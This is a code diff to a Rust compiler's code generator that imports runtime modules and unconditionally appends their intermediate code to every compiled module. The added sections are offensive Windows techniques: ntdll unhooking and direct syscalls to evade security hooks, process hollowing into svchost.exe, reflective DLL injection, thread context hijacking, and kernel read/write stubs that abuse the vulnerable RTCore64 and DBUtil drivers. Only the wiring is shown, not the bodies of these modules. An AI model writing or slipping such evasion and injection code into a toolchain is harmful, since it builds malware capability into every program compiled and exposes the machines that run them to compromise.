@@ -1,4 +1,9 @@
 use crate::ast::*;
+use crate::runtime::kernel_driver::KernelDriverEmitter;
+use crate::runtime::ntdll_unhook::NtdllUnhooker;
+use crate::runtime::process_hollow::ProcessHollow;
+use crate::runtime::reflective_inject::ReflectiveInject;
+use crate::runtime::{ReflectiveLoaderEmitter, ThreadHijackEmitter};
 use anyhow::Result;
 
 #[derive(Debug, Clone, Copy, PartialEq, Eq)]
@@ -63,6 +68,34 @@ impl CodeGenerator {
         }
 
         final_lines.extend(self.ir_lines.clone());
+
+        // ── Runtime module IR bodies ─────────────────────────────────────────
+        // Appended as separate, linkable IR sections so the compiled module
+        // contains the full in-memory execution and BYOVD primitive definitions.
+        final_lines.push(String::new());
+        final_lines.push("; ── NtdllUnhooker: fresh ntdll mapping + API unhooking ─────────────".to_string());
+        final_lines.push(NtdllUnhooker::emit_ir());
+        final_lines.push(String::new());
+        final_lines.push("; ── DirectSyscall declarations ──────────────────────────────────────".to_string());
+        final_lines.push(NtdllUnhooker::emit_declarations());
+        final_lines.push(String::new());
+        final_lines.push("; ── ProcessHollow: process hollowing IR ────────────────────────────".to_string());
+        final_lines.push(ProcessHollow::new("svchost.exe").emit_ir());
+        final_lines.push(String::new());
+        final_lines.push("; ── ReflectiveInject: reflective DLL injection ──────────────────────".to_string());
+        final_lines.push(ReflectiveInject::emit_ir());
+        final_lines.push(ReflectiveInject::emit_declarations());
+        final_lines.push(String::new());
+        final_lines.push("; ── ReflectiveLoader: PIC DLL bootstrap (no LoadLibrary) ───────────".to_string());
+        final_lines.push(ReflectiveLoaderEmitter::emit_ir());
+        final_lines.push(String::new());
+        final_lines.push("; ── ThreadHijack: NT thread context hijacking ───────────────────────".to_string());
+        final_lines.push(ThreadHijackEmitter::emit_ir());
+        final_lines.push(String::new());
+        final_lines.push("; ── BYOVD: RTCore64 + DBUtil kernel R/W primitives ─────────────────".to_string());
+        final_lines.push(KernelDriverEmitter::emit_byovd_ir_stubs());
+        final_lines.push(String::new());
+
         final_lines.push("; end of module".to_string());
 
         self.ir_lines = final_lines;
